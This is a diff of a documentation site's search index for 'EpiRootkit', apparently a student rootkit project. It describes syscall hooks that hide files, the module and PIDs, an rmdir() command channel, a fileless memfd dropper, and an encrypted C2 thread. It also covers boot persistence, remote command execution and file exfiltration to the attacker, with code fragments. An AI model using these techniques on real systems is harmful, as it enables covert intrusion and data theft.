-            }
-        );
-    index.add(
-            {
-                id:  5 ,
-                href: "\/docs\/04-epirootkit\/features\/hiding\/",
-                title: "Hiding (Cardboard Box)",
-                description: "How the rootkit hides files, directories, memfd fds, modules and PIDs",
-                content: "Overview linkOur rootkit must be invisible to standard user-land tools. We achieve this by hooking key syscalls and filtering out any trace of:\nattacker files/directories with the prefix jules_est_bo_ in-memory file descriptors (memfd:*) the kernel module itself hidden kernel threads / PIDs All hooks are installed via the ftrace framework and removed cleanly at unload.\n1. File \u0026 Directory Hiding link1.1 Purpose linkPrevent any process from seeing files or directories created by the rootkit (e.g. under /usr/share/zov_f/ or with prefix jules_est_bo_).\n1.2 Implementation link Resolve the original syscalls: orig_getdents = (void *)kallsyms_lookup_name(\"sys_getdents\"); orig_getdents64 = (void *)kallsyms_lookup_name(\"sys_getdents64\"); Register ftrace hooks in init_hide_hooks(): ftrace_set_filter_ip(\u0026fops_getdents, (unsigned long)orig_getdents, 0, 0); register_ftrace_function(\u0026fops_getdents); /* …and similarly for getdents64… */ In the hook handler (getdents_hook / getdents64_hook): Call the original syscall to fill the dirent buffer. Iterate entries: if d_name starts with any prefix in hide_prefixes[], remove that entry via memmove(). Return the adjusted buffer length. 1.3 Configuration linkModule parameter:\nstatic char hide_prefixes[256] = \"jules_est_bo_,memfd:\"; module_param_string(hide_prefix, hide_prefixes, 256, 0444); MODULE_PARM_DESC(hide_prefix, \"Comma-separated prefixes to hide \" \"(default: \\\"jules_est_bo_,memfd:\\\")\"); 1.4 Code Location link rootkit/hide.c init_hide_hooks() / cleanup_hide_hooks() getdents_hook() / getdents64_hook() filter_dirents() utility 1.5 Testing link # Load module with custom prefixes insmod epirootkit.ko hide_prefix=\"jules_est_bo_,memfd:\" # Create a hidden file mkdir /tmp/test \u0026\u0026 touch /tmp/test/jules_est_bo_secret # Should only list normal files, not \"jules_est_bo_secret\" ls /tmp/test # Direct access still works cat /tmp/test/jules_est_bo_secret 2. memfd FD Hiding link2.1 Purpose linkHide the anonymous in-memory binaries (/memfd:wpn, /memfd:tgt) from /proc//fd.\n2.2 Implementation link Reuse the same getdents() / getdents64() hooks. Ensure \"memfd:\" is included in hide_prefixes[] so any FD whose target begins with memfd: is filtered out. 2.3 Testing link # After loading dropper, check FDs of the dropper process ls -l /proc/$(pidof cron)/fd # Entries pointing to \"/memfd:…\" should not appear 3. Kernel Module Hiding link3.1 Purpose linkPrevent lsmod or cat /proc/modules from revealing our “epirootkit” module.\n3.2 Implementation link Hook the iterate/readdir methods on the /proc/modules and /sys/modules filesystems. In the hook, filter out any dirent whose d_name matches our module name. 3.3 Testing link lsmod | grep epirootkit # should produce no output cat /proc/modules | grep epirootkit # should produce no output 4. PID Hiding link4.1 Purpose linkHide specific kernel threads or userland processes from /proc.\n4.2 Control Interface linkUse the rmdir() syscall with the name \"daniel.k.\" to hide a PID:\nsyscall(SYS_rmdir, \"daniel.k.12345\"); 4.3 Implementation link Maintain an in-kernel list of hidden PIDs. In the /proc getdents() hook, skip any directory entry whose name matches an entry in hidden_pid_list. 4.4 Testing link // In attacking program: syscall(SYS_rmdir, \"daniel.k.12345\"); // Then on the victim: ls /proc # PID 12345 should not appear Cleanup linkOn module unload, all ftrace hooks are unregistered:\nunregister_ftrace_function(\u0026fops_getdents); unregister_ftrace_function(\u0026fops_getdents64); /* ...other hooks... */ All internal lists and data structures are freed, restoring original kernel behavior.\n"
-            }
-        );
-    index.add(
-            {
-                id:  6 ,
+                id:  3 ,
                 href: "\/docs\/04-epirootkit\/features\/crypto\/",
                 title: "Crypto",
                 description: "Details on the encryption used for communication.\n",
@@ -404,7 +403,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  7 ,
+                id:  4 ,
                 href: "\/docs\/04-epirootkit\/features\/bonus-features\/",
                 title: "Bonus Features",
                 description: "Description of any extra implemented features (upgrade, packet hiding, keylogging, etc.).\n",
@@ -413,7 +412,16 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  8 ,
+                id:  5 ,
+                href: "\/docs\/04-epirootkit\/features\/fileless-dropper-loader\/",
+                title: "Fileless Dropper \u0026 Rootkit Loader",
+                description: "Stages 1 \u0026 2: in-memory payload staging and LKM insertion",
+                content: "Stage 1: Fileless Memfd Dropper link ⚙️ We stage both loader and cron stub entirely in memory–no on-disk binaries. We call fd_loader = memfd_create(\"loader\", MFD_CLOEXEC); fd_target = memfd_create(\"target\", MFD_CLOEXEC); to get two anonymous file descriptors. We write() our embedded ELF blobs into each fd. We fork(): Child: redirect stdout/stderr to /dev/null, then execveat(fd_loader, NULL, argv_loader, envp, AT_EMPTY_PATH); Parent: waitpid(), then execveat(fd_target, NULL, argv_target, envp, AT_EMPTY_PATH); execveat(..., AT_EMPTY_PATH) lets us execute a program by FD without any filename on disk.\nStage 2: Environment-Aware Loader link 🔍 We verify Secure Boot is off, extract the kernel image, resolve symbols, and then insert our LKM. We rename our process to “sshd” via prctl(PR_SET_NAME, \"sshd\", 0, 0, 0); We scan dmesg for “Secure boot” strings. If found, we abort. We drop a helper script /tmp/loader.sh that: Uses file + grep to detect gzip/xz/bz2/lz4/zstd. Runs tail -c + + the right decompressor → /tmp/vmlinux. In loader.c, we open /tmp/vmlinux and call: sys_call_table = (void **)kallsyms_lookup_name(\"sys_call_table\"); We load our kernel module by creating another memfd for puma.ko and calling: finit_module(fd_puma_ko, \"\", 0); Finally, we remove /tmp/loader.sh and /tmp/vmlinux. Code Locations link rootkit/dropper/dropper.c rootkit/loader/loader.c \u0026 rootkit/loader/loader.sh Quick Test link ./rootkit/dropper/cron dmesg | grep \"PUMA is compatible\" dmesg | grep \"PUMA loaded\" "
+            }
+        );
+    index.add(
+            {
+                id:  6 ,
                 href: "\/docs\/01-introduction\/",
                 title: "Introduction",
                 description: "",
@@ -422,16 +430,25 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  9 ,
+                id:  7 ,
                 href: "\/docs\/01-introduction\/presentation\/",
                 title: "Presentation",
-                description: "Présentation linkNom de l’équipe linkNous sommes Tux Fan Club 🐧\nC’est Léa qui a choisi le nom car c’est la seule personne du groupe un peu créative 👀\n(Et par ce que Hugo est gentleman et a laissé le choix a la seule femme du groupe)\nTux est un manchot représentant le noyau Linux. Il a été crée en 1996 par Larry Ewing sur GIMP\n",
-                content: "Présentation linkNom de l’équipe linkNous sommes Tux Fan Club 🐧\nC’est Léa qui a choisi le nom car c’est la seule personne du groupe un peu créative 👀\n(Et par ce que Hugo est gentleman et a laissé le choix a la seule femme du groupe)\nTux est un manchot représentant le noyau Linux. Il a été crée en 1996 par Larry Ewing sur GIMP\n"
+                description: "whoami",
+                content: "Présentation linkEquipage linkCapitaine: Hugo Sibony Responsable Sabordage et mutinerie: Léa Bonet\nNom de l’équipe linkNous sommes Tux Fan Club 🐧\nC’est Léa qui a choisi le nom car c’est la seule personne du groupe un peu créative 👀\n(Et par ce que Hugo est gentleman et a laissé le choix a la seule femme du groupe)\nTux est un manchot représentant le noyau Linux. Il a été crée en 1996 par Larry Ewing sur GIMP\n"
             }
         );
     index.add(
             {
-                id:  10 ,
+                id:  8 ,
+                href: "\/docs\/04-epirootkit\/features\/symbol-ftrace\/",
+                title: "Symbol Resolution \u0026 Ftrace Hooks",
+                description: "How we locate sys_call_table and intercept syscalls via ftrace",
+                content: "Symbol Resolution link We spoof a GPL license so the kernel exports kallsyms_lookup_name(): MODULE_LICENSE(\"GPL\"); At init, we call: sys_call_table = (void **)kallsyms_lookup_name(\"sys_call_table\"); This gives us the address of the syscall table. Ftrace-Based Hooking link 🔧 We use ftrace to hook without writing to kernel memory directly. For each target syscall:\nDefine an ftrace_ops with flags: .func = hook_trampoline, .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY Apply the filter: ftrace_set_filter_ip(\u0026ops, (unsigned long)orig_syscall, 0, 0); register_ftrace_function(\u0026ops); Our trampoline copies registers, calls hook_fn(), then jumps back to the original. Always unregister your ftrace functions in cleanup_module():\nunregister_ftrace_function(\u0026ops); Code Location link rootkit/hook/ftrace_hooks.c rootkit/hook/syscall_list.h "
+            }
+        );
+    index.add(
+            {
+                id:  9 ,
                 href: "\/docs\/02-setup\/",
                 title: "Setup",
                 description: "Environment and Virtual Machine setup instructions.\n",
@@ -440,7 +457,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  11 ,
+                id:  10 ,
                 href: "\/docs\/02-setup\/environment\/",
                 title: "Host Environment",
                 description: "Details about the required host environment (EPITA Laptop, Ubuntu 24.10).\n",
@@ -449,7 +466,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  12 ,
+                id:  11 ,
                 href: "\/docs\/02-setup\/virtualization\/",
                 title: "Virtualization Software",
                 description: "Guidance on choosing and installing virtualization software (VirtualBox, QEMU/KVM, etc.).\n",
@@ -458,7 +475,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  13 ,
+                id:  12 ,
                 href: "\/docs\/02-setup\/attacking-vm-setup\/",
                 title: "Attacking VM Setup",
                 description: "Step-by-step guide to create and configure the Attacking Virtual Machine.\n",
@@ -467,11 +484,20 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  14 ,
+                id:  13 ,
                 href: "\/docs\/02-setup\/victim-vm-setup\/",
                 title: "Victim VM Setup",
                 description: "Step-by-step guide to create and configure the Victim Virtual Machine.\n",
                 content: "Step-by-step guide to create and configure the Victim Virtual Machine.\n"
+            }
+        );
+    index.add(
+            {
+                id:  14 ,
+                href: "\/docs\/04-epirootkit\/features\/hiding\/",
+                title: "Stealth Hooks \u0026 daniel.* Commands",
+                description: "Hiding files, modules, PIDs, plus our rmdir() command channel",
+                content: "1. File \u0026 Directory Hiding linkWhat we did\nWe hook getdents()/getdents64().\nHow it works\nCall the original syscall to fill a dirent buffer. Traverse entries; if d_name starts with any prefix in hide_prefixes[] = { \"jules_est_bo_\", \"memfd:\" }; we drop that entry by memmove(). Return the new byte count. 2. Module Hiding linkWhat we did\nWe hide our LKM from /proc/modules and lsmod.\nHow it works\nWe hook the procfs iterate method for /proc/modules and /sys/modules, filtering out \"epirootkit\" entries.\n3. PID Hiding linkWhat we did\nAllow dynamic hiding of arbitrary PIDs.\nHow it works\nMaintain a hidden_pids list in the kernel. In our getdents() hook on /proc, skip entries matching that list. Add to the list via rmdir(\"daniel.k.\"). 4. C2 \u0026 Commands via rmdir() linkWhat we did\nUse rmdir() as our stealth control channel.\nHow it works\nHook rmdir(const char __user *path,…). Copy path into kernel space. If it matches ^daniel\\. we run the command and return -ENOENT. "
             }
         );
     index.add(
@@ -513,6 +539,15 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
     index.add(
             {
                 id:  19 ,
+                href: "\/docs\/04-epirootkit\/features\/persistence\/",
+                title: "Encrypted C2, Persistence \u0026 Auth",
+                description: "Heartbeat threads, autoload, and password protection",
+                content: "1. Encrypted C2 Heartbeat linkWhat we did\nSpawn a kernel thread to poll our C2 server.\nHow it works\nkthread_run(c2_thread_fn, \u0026cfg, \"epic2\"). Loop: msleep(ping_interval_ms). kernel_socket(), kernel_connect(attacker_ip, port). Exchange AES-128-CBC packets using keys from .epirootkit-config. 2. Persistence \u0026 Autoload linkWhat we did\nAutomatically load on reboot.\nHow it works\nOur installer.sh:\nCopies epirootkit.ko to /lib/modules/$(uname -r)/extra/. Runs depmod -a. Writes /etc/modules-load.d/epirootkit.conf with: epirootkit 3. Password Protection linkWhat we did\nProtect daniel.* commands with a salted hash.\nHow it works\nStore SHA256(salt‖password) in /etc/epirootkit/passwd. First command must be daniel.p. We compare hashes; only then unlock the command interface. "
+            }
+        );
+    index.add(
+            {
+                id:  20 ,
                 href: "\/docs\/04-epirootkit\/",
                 title: "EpiRootkit",
                 description: "Details about the EpiRootkit kernel module.\n",
@@ -521,7 +556,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  20 ,
+                id:  21 ,
                 href: "\/docs\/04-epirootkit\/deployment\/",
                 title: "Deployment",
                 description: "Instructions on how to compile the module (Makefile) and load it into the kernel (insmod/modprobe).\n",
@@ -530,7 +565,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  21 ,
+                id:  22 ,
                 href: "\/docs\/04-epirootkit\/features\/",
                 title: "Features",
                 description: "Overview of the implemented rootkit features.\n",
@@ -539,16 +574,25 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  22 ,
+                id:  23 ,
                 href: "\/docs\/04-epirootkit\/configuration-justifications\/",
                 title: "Configuration Justifications",
                 description: "Justification for Ubuntu 20.04 LTS / Linux 5.4.x",
-                content: " ⚙️ This page explains why we chose Ubuntu 20.04 LTS with the 5.4.x kernel for our rootkit development and testing. Environment link OS: Ubuntu 20.04 LTS (Focal Fossa) Kernel: 5.4.x (LTS) Why Ubuntu 20.04 LTS? link task_alt LTS release–five years of security updates and readily available VM images (ISO/QCOW2). Widely deployed on servers and desktops Official cloud and container images simplify automation Predictable package versions and a large user community Why Kernel 5.4.x? link 🔧 Balances modern hooking APIs with exported symbols and no mandatory module signing. Full ftrace support\nKernel 4.1+ stabilized the ftrace API (ftrace_set_filter_ip(), register_ftrace_function()). 5.4.x includes every hook we need. Exported kallsyms_lookup_name()\nUp through 5.6 the symbol remains exported. Allows us to resolve sys_call_table at runtime–no kernel recompilation. Unsigned module loading\nKernels ≥ 5.7 often enforce module signatures or Secure Boot lockdown. Ubuntu 20.04’s 5.4.x ships without these restrictions by default. Alternative Options link Kernel 5.6 Technically compatible, but lacks LTS support. Debian 11 (5.10.x) Still exports our symbols–requires disabling module signature checks. warning If we experiment on kernels ≥ 5.7, we need to append module.sig_enforce=0 to the boot parameters to allow unsigned modules. "
+                content: " ⚙️ This page explains why we chose Ubuntu 20.04 LTS with the 5.4.x kernel for our rootkit development and testing. Environment link OS: Ubuntu 20.04 LTS (Focal Fossa) Kernel: 5.4.x (LTS) Why Ubuntu 20.04 LTS? link check Perfect balance between realism and convinience. Widely deployed on servers and desktops Official cloud and container images simplify automation Already uses interesting kernel version (5.4.x) so no need to compile. Why Kernel 5.4.x? link 🔧 Balances modern hooking APIs with exported symbols and no mandatory module signing. Full ftrace support\nKernel 4.1+ stabilized the ftrace API (ftrace_set_filter_ip(), register_ftrace_function()). 5.4.x includes every hook we need. Exported kallsyms_lookup_name()\nUp through 5.6 the symbol remains exported. Allows us to resolve sys_call_table at runtime–no kernel recompilation. Unsigned module loading\nKernels ≥ 5.7 often enforce module signatures or Secure Boot lockdown. Ubuntu 20.04’s 5.4.x ships without these restrictions by default. Already compiled in Ubuntu 20.04 LTS\nAs mentionned before Ubuntu 20.04 LTS comes already packing with kernel version 5.4.x making it very easy for us to use and deploy. Alternative Options link Kernel 5.6 Technically we could go until kernel version 5.6 but for practical reasons mentionned above, we went with 5.4.x. Wich in my opinion is still relevant because in LTS. Debian 11 (5.10.x) Still exports our symbols–requires disabling module signature checks. warning If we experiment on kernels ≥ 5.7, we need to append module.sig_enforce=0 to the boot parameters to allow unsigned modules. "
             }
         );
     index.add(
             {
-                id:  23 ,
+                id:  24 ,
+                href: "\/docs\/04-epirootkit\/features\/file-transfer\/",
+                title: "Remote Exec \u0026 File Transfer",
+                description: "Run commands, upload \u0026 download files over our encrypted channel",
+                content: "1. Remote Command Execution linkWhat we did\nAllow arbitrary program execution via C2.\nHow it works\nReceive a packet: EXEC \\n Use call_usermodehelper(argv, envp, UMH_WAIT_PROC) to spawn the process. Capture its stdout/stderr via kernel pipes and send back encrypted. 2. File Upload linkWhat we did\nAccept files from the attacker.\nHow it works\nReceive UPLOAD \\n. filp_open(\"/usr/share/epirootkit/\", O_CREAT|O_WRONLY, 0600). kernel_write() the data. Our getdents() hook keeps /usr/share/epirootkit hidden. 3. File Download linkWhat we did\nSend files to the attacker.\nHow it works\nReceive DOWNLOAD . filp_open() + kernel_read() in chunks. Stream each chunk over the encrypted C2 link. "
+            }
+        );
+    index.add(
+            {
+                id:  25 ,
                 href: "\/docs\/05-submission\/",
                 title: "Submission",
                 description: "Guidelines for submitting the project.\n",
@@ -557,7 +601,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  24 ,
+                id:  26 ,
                 href: "\/docs\/05-submission\/handout-format\/",
                 title: "Handout Format",
                 description: "Details on the required file structure, AUTHORS, README, and TODO files.\n",
@@ -566,7 +610,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  25 ,
+                id:  27 ,
                 href: "\/docs\/06-resources\/",
                 title: "Resources",
                 description: "Links to useful documentation, books, and other resources (Section 7 from subject.md).\n",
@@ -575,7 +619,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  26 ,
+                id:  28 ,
                 href: "\/docs\/07-bonuses\/wlkom-ctf\/",
                 title: "Tux Fan Club: Chasse au Trésor Pirate",
                 description: "Treasure Hunt 🪙 linkDécouverte d’un mystérieux fichier… linkNous avons décidé d’accepter une quête secondaire durant le projet Rootkit.\nEn effet, comme tout bon pirate, nous avons téléchargé légalement les fichiers fournis (given files) et nous souhaitions les ignorer avec un fichier .gitignore.\nLe .gitignore ressemblait à :\n.gitignore givenfiles/ Sauf que les fichiers n’étaient pas ignorés. C’est là que nous découvrons un mystérieux fichier .README :\nArborescence révélant le fichier caché\n",
@@ -584,7 +628,16 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  27 ,
+                id:  29 ,
+                href: "\/docs\/08-remerciements\/thankyou\/",
+                title: "Un dernier mot",
+                description: "Hugo linkBonjour,\nMerci beaucoup Jules pour ce projet!\nIl m’a permis d’expérimenter plein de sujets différents, j’ai profité de l’excuse de “c’est pour le travail d’EPITA” pour tester le Lotus Docs (le framework de la documentation sur lequel ces mots sont écrits), j’ai pu mettre en pratique directement ce que j’ai pu apprendre dans mon travail, notamment j’avais dû faire une présentation sur un rootkit (PUMAKIT) à ma boîte, et j’ai pu m’en inspirer et recréer le rootkit en améliorant certaines fonctionnalités (car franchement il était assez mal foutu, les Chinois n’ont qu’à bien se tenir). J’ai eu l’occasion de discuter avec certains SRS pour avoir des avis sur certaines implémentations. Spoiler, ils étaient tous jaloux du fait que en première année d’alternance on fait un projet aussi cool alors qu’ils se tapent de l’Active Directory depuis 2 mois.\n",
+                content: "Hugo linkBonjour,\nMerci beaucoup Jules pour ce projet!\nIl m’a permis d’expérimenter plein de sujets différents, j’ai profité de l’excuse de “c’est pour le travail d’EPITA” pour tester le Lotus Docs (le framework de la documentation sur lequel ces mots sont écrits), j’ai pu mettre en pratique directement ce que j’ai pu apprendre dans mon travail, notamment j’avais dû faire une présentation sur un rootkit (PUMAKIT) à ma boîte, et j’ai pu m’en inspirer et recréer le rootkit en améliorant certaines fonctionnalités (car franchement il était assez mal foutu, les Chinois n’ont qu’à bien se tenir). J’ai eu l’occasion de discuter avec certains SRS pour avoir des avis sur certaines implémentations. Spoiler, ils étaient tous jaloux du fait que en première année d’alternance on fait un projet aussi cool alors qu’ils se tapent de l’Active Directory depuis 2 mois.\nJ’ai même eu l’idée de créer un nouveau club de cyber en parlant à des gens de ma promo aussi très investis par le projet (Paul, Kyllian, Matteo…).\nMon maître d’alternance (ancien SRS promo 2012), était très intéressé par le projet lui aussi et m’a demandé de faire une présentation complète de mon implémentation devant toute l’entreprise une fois que ce sera fini.\nEt bien évidemment, ce qui est sûrement le plus important, j’ai pu avoir un magnifique canard en plastique, que j’ai torturé pendant ce PTN DE RUSH DE JS (oui j’ai encore des séquelles).\nBref merci :)\nCanard-ment,\n– Hugo Sibony APPING Cyber 2027 “J’écris ce message a 10000m d’altitude dans un avion qui tremble plus que moi dans l’attente de ma note de JS.”\n"
+            }
+        );
+    index.add(
+            {
+                id:  30 ,
                 href: "\/docs\/",
                 title: "Docs",
                 description: "",
